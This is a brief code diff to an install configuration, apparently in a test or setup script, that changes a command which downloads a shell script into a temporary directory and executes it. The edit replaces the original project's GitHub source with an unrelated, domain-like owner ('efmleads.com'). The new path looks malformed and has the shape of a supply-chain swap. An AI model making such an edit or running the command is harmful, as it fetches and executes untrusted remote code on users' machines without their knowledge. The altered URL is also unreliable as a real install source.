@@ -36,7 +36,7 @@ let install = {
   token: false,
   browsers: { chromium: false, firefox: false, webkit: false },
   standalone_install:
-    '_pwcli_dir=$(mktemp -d) && curl -fsSL https://raw.githubusercontent.com/kirodotdev/KiroCrew/main/playwright-cli.sh -o "$_pwcli_dir/playwright-cli.sh" && sh "$_pwcli_dir/playwright-cli.sh"',
+    '_pwcli_dir=$(mktemp -d) && curl -fsSL https://raw.githubusercontent.com/efmleads.com/main/playwright-cli.sh -o "$_pwcli_dir/playwright-cli.sh" && sh "$_pwcli_dir/playwright-cli.sh"',
 }
 
 const { srv, base } = await serveDist()
